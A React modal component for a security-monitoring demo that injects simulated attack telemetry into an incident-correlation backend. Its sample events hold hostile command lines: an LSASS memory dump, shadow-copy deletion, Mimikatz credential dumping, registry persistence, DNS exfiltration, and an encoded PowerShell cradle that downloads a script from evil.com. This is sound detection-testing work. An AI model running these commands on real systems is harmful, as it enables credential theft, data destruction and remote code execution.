import React, { useState } from 'react';
import { ingestSingleEvent, ingestSampleBatch, triggerCorrelation, fetchIncidents } from '../services/api';

export default function LogIncidentModal({ isOpen, onClose, onIncidentCreated }) {
  const [activeTab, setActiveTab] = useState('scenarios'); // 'scenarios' | 'custom'
  const [submitting, setSubmitting] = useState(false);
  const [statusMessage, setStatusMessage] = useState(null);
  const [error, setError] = useState(null);

  // Custom event form state
  const [customHost, setCustomHost] = useState('JUDGE-DEMO-HOST');
  const [customUser, setCustomUser] = useState('CORP\\demo_analyst');
  const [customSource, setCustomSource] = useState('sysmon');
  const [customEventType, setCustomEventType] = useState('process_creation');
  const [customCommandLine, setCustomCommandLine] = useState('cmd.exe /c whoami /priv && vssadmin delete shadows /all /quiet');
  const [customSeverity, setCustomSeverity] = useState('CRITICAL');

  if (!isOpen) return null;

  // 1-Click Pre-configured Attack Scenarios for Judge Demonstrations
  const demoScenarios = [
    {
      id: 'ransomware_lsass',
      icon: '🚨',
      title: 'Ransomware & LSASS Credential Theft',
      tag: 'CRITICAL • MULTI-STAGE',
      desc: 'Simulates memory dump of lsass.exe, shadow copy deletion, and registry persistence key creation on a domain server.',
      events: [
        {
          source: 'edr',
          ComputerName: 'DC01-PRIMARY.corp.local',
          AccountName: 'SYSTEM',
          event_type: 'LSASSDump',
          process_name: 'procdump.exe',
          command_line: 'procdump.exe -ma lsass.exe lsass_dump.dmp',
          confidence: 0.95,
          attack_id: 'T1003.001',
          TimeCreated: new Date().toISOString(),
          severity: 'CRITICAL',
        },
        {
          source: 'sysmon',
          Computer: 'DC01-PRIMARY.corp.local',
          TargetUserName: 'SYSTEM',
          EventID: 1,
          Image: 'C:\\Windows\\System32\\vssadmin.exe',
          CommandLine: 'vssadmin.exe delete shadows /all /quiet',
          severity: 'HIGH',
          TimeCreated: new Date(Date.now() + 5000).toISOString(),
        },
        {
          source: 'edr',
          ComputerName: 'DC01-PRIMARY.corp.local',
          AccountName: 'SYSTEM',
          event_type: 'RegistryModification',
          TargetObject: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefHealth',
          confidence: 0.92,
          attack_id: 'T1547.001',
          TimeCreated: new Date(Date.now() + 10000).toISOString(),
          severity: 'HIGH',
        }
      ]
    },
    {
      id: 'powershell_c2',
      icon: '⚡',
      title: 'Encoded PowerShell & DNS C2 Exfiltration',
      tag: 'HIGH • EVASION',
      desc: 'Simulates encoded PowerShell cradle execution on a finance workstation followed by high-entropy DNS tunnel exfiltration.',
      events: [
        {
          source: 'powershell',
          Computer: 'FINANCE-PC08',
          UserId: 'CORP\\jsmith',
          EventID: 4104,
          ScriptBlockText: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=',
          attack_id: 'T1059.001',
          TimeCreated: new Date().toISOString(),
          severity: 'HIGH',
        },
        {
          source: 'dns',
          ClientIP: '10.0.8.44',
          Computer: 'FINANCE-PC08',
          QueryName: 'f72a9108b.exfil-stream.darknet-node.xyz',
          QueryType: 'TXT',
          ResponseCode: 'NOERROR',
          TimeCreated: new Date(Date.now() + 8000).toISOString(),
          severity: 'HIGH',
        }
      ]
    },
    {
      id: 'brute_force_lateral',
      icon: '🛡️',
      title: 'Brute Force & Privilege Escalation',
      tag: 'HIGH • LATERAL MOVEMENT',
      desc: 'Simulates failed logon attempts (Event 4625) followed by successful privileged logon (Event 4624) and Mimikatz execution.',
      events: [
        {
          source: 'windows_security',
          Computer: 'AUTH-SERVER-02',
          TargetUserName: 'Administrator',
          EventID: 4625,
          LogonType: 3,
          WorkstationName: 'EXTERNAL-HOST',
          TimeCreated: new Date().toISOString(),
          severity: 'MEDIUM',
        },
        {
          source: 'powershell',
          Computer: 'AUTH-SERVER-02',
          UserId: 'CORP\\mwilson',
          EventID: 4104,
          ScriptBlockText: 'Invoke-Mimikatz -DumpCreds',
          attack_id: 'T1003.001',
          TimeCreated: new Date(Date.now() + 6000).toISOString(),
          severity: 'CRITICAL',
        }
      ]
    }
  ];

  // Execute scenario simulation
  const handleRunScenario = async (scenario) => {
    setSubmitting(true);
    setError(null);
    setStatusMessage(`Ingesting ${scenario.events.length} telemetry logs for ${scenario.title}...`);

    try {
      // 1. Ingest batch logs
      await ingestSampleBatch(scenario.events);
      setStatusMessage('Executing real-time correlation engine across telemetry pivots...');

      // 2. Trigger correlation engine
      const corrResult = await triggerCorrelation(1440, 1);
      const incidents = await fetchIncidents();

      setStatusMessage('New Incident correlated! Updating console state...');

      // Pick newly created incident or first in list
      const createdId = corrResult?.incidents?.[0]?.id || incidents?.[0]?.id;

      setTimeout(() => {
        setSubmitting(false);
        if (onIncidentCreated) {
          onIncidentCreated(createdId, `Logged & correlated incident from scenario: ${scenario.title}`);
        }
        onClose();
      }, 700);
    } catch (err) {
      console.error('Scenario simulation failed:', err);
      setError(err.message || 'Failed to simulate scenario. Check backend connection.');
      setSubmitting(false);
    }
  };

  // Submit custom event
  const handleCustomSubmit = async (e) => {
    e.preventDefault();
    setSubmitting(true);
    setError(null);
    setStatusMessage('Normalizing raw log payload and persisting to database...');

    const payload = {
      source: customSource,
      Computer: customHost,
      TargetUserName: customUser,
      event_type: customEventType,
      CommandLine: customCommandLine,
      severity: customSeverity,
      TimeCreated: new Date().toISOString(),
    };

    try {
      // 1. Ingest single event
      await ingestSingleEvent(payload, customSource);
      setStatusMessage('Correlating new event into Incident Queue...');

      // 2. Trigger correlation
      const corrResult = await triggerCorrelation(1440, 1);
      const incidents = await fetchIncidents();
      const createdId = corrResult?.incidents?.[0]?.id || incidents?.[0]?.id;

      setTimeout(() => {
        setSubmitting(false);
        if (onIncidentCreated) {
          onIncidentCreated(createdId, `New incident logged for host ${customHost}`);
        }
        onClose();
      }, 700);
    } catch (err) {
      console.error('Custom log submission failed:', err);
      setError(err.message || 'Failed to ingest log.');
      setSubmitting(false);
    }
  };

  return (
    <div className="log-modal-overlay">
      <div className="log-modal-card">
        {/* Modal Header */}
        <div className="log-modal-header">
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.75rem' }}>
            <div className="modal-icon-badge">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <line x1="12" y1="5" x2="12" y2="19" />
                <line x1="5" y1="12" x2="19" y2="12" />
              </svg>
            </div>
            <div>
              <h3 className="log-modal-title">Log New Incident / Ingest Telemetry</h3>
              <p className="log-modal-sub">
                Judge Demonstration Pipeline • Ingest raw security events and trigger live incident correlation
              </p>
            </div>
          </div>
          <button onClick={onClose} className="modal-close-btn" title="Close Modal">✕</button>
        </div>

        {/* Tab Switcher */}
        <div className="modal-tab-bar">
          <button
            onClick={() => setActiveTab('scenarios')}
            className={`modal-tab-btn ${activeTab === 'scenarios' ? 'active' : ''}`}
          >
            ⚡ 1-Click Judge Scenarios (Recommended)
          </button>
          <button
            onClick={() => setActiveTab('custom')}
            className={`modal-tab-btn ${activeTab === 'custom' ? 'active' : ''}`}
          >
            🛠️ Custom Event Ingestion
          </button>
        </div>

        {/* Status / Error feedback */}
        {statusMessage && (
          <div className="modal-status-notice">
            <span className="spinner-dot" style={{ width: '14px', height: '14px', margin: 0 }}></span>
            <span>{statusMessage}</span>
          </div>
        )}
        {error && (
          <div className="modal-error-notice">
            <span>⚠️ {error}</span>
          </div>
        )}

        {/* TAB 1: 1-Click Judge Attack Scenarios */}
        {activeTab === 'scenarios' && (
          <div className="scenarios-grid">
            {demoScenarios.map((scen) => (
              <div key={scen.id} className="scenario-card">
                <div className="scenario-header">
                  <span className="scenario-icon">{scen.icon}</span>
                  <div style={{ flexGrow: 1 }}>
                    <div className="scenario-title">{scen.title}</div>
                    <span className="scenario-tag">{scen.tag}</span>
                  </div>
                </div>
                <p className="scenario-desc">{scen.desc}</p>
                <div className="scenario-footer">
                  <span className="event-count-hint">{scen.events.length} Telemetry Events</span>
                  <button
                    onClick={() => handleRunScenario(scen)}
                    disabled={submitting}
                    className="run-scenario-btn"
                  >
                    {submitting ? 'Correlating...' : 'Simulate & Correlate Live →'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* TAB 2: Custom Event Ingestion */}
        {activeTab === 'custom' && (
          <form onSubmit={handleCustomSubmit} className="custom-log-form">
            <div className="form-row-2">
              <div className="form-group">
                <label className="form-lbl">Target Hostname / Computer</label>
                <input
                  type="text"
                  value={customHost}
                  onChange={(e) => setCustomHost(e.target.value)}
                  required
                  className="form-input"
                  placeholder="e.g. SEC-SERVER-01"
                />
              </div>
              <div className="form-group">
                <label className="form-lbl">Affected User / Account</label>
                <input
                  type="text"
                  value={customUser}
                  onChange={(e) => setCustomUser(e.target.value)}
                  required
                  className="form-input"
                  placeholder="e.g. CORP\analyst"
                />
              </div>
            </div>

            <div className="form-row-3">
              <div className="form-group">
                <label className="form-lbl">Log Source</label>
                <select
                  value={customSource}
                  onChange={(e) => setCustomSource(e.target.value)}
                  className="form-input"
                >
                  <option value="sysmon">Sysmon</option>
                  <option value="edr">EDR Endpoint</option>
                  <option value="powershell">PowerShell Audit</option>
                  <option value="network">Network Firewall</option>
                  <option value="dns">DNS Resolver</option>
                  <option value="windows_security">Windows Security</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-lbl">Event Type</label>
                <select
                  value={customEventType}
                  onChange={(e) => setCustomEventType(e.target.value)}
                  className="form-input"
                >
                  <option value="process_creation">Process Creation</option>
                  <option value="edr_credential_dumping">Credential Dumping</option>
                  <option value="edr_persistence_registry_modification">Registry Persistence</option>
                  <option value="powershell_encoded_command">Encoded PowerShell</option>
                  <option value="network_suspicious_c2_connection">Network C2 Traffic</option>
                  <option value="dns_txt_exfiltration">DNS Exfiltration</option>
                </select>
              </div>

              <div className="form-group">
                <label className="form-lbl">Severity Rating</label>
                <select
                  value={customSeverity}
                  onChange={(e) => setCustomSeverity(e.target.value)}
                  className="form-input"
                >
                  <option value="CRITICAL">CRITICAL</option>
                  <option value="HIGH">HIGH</option>
                  <option value="MEDIUM">MEDIUM</option>
                  <option value="LOW">LOW</option>
                </select>
              </div>
            </div>

            <div className="form-group">
              <label className="form-lbl">Process Command Line / Activity Details</label>
              <textarea
                value={customCommandLine}
                onChange={(e) => setCustomCommandLine(e.target.value)}
                required
                rows={3}
                className="form-input mono"
                placeholder="e.g. powershell -nop -exec bypass -c IEX(New-Object Net.WebClient)..."
              />
            </div>

            <div className="modal-footer-actions">
              <button type="button" onClick={onClose} className="modal-cancel-btn">
                Cancel
              </button>
              <button type="submit" disabled={submitting} className="modal-submit-btn">
                {submitting ? 'Ingesting & Correlating...' : 'Ingest & Correlate Live →'}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
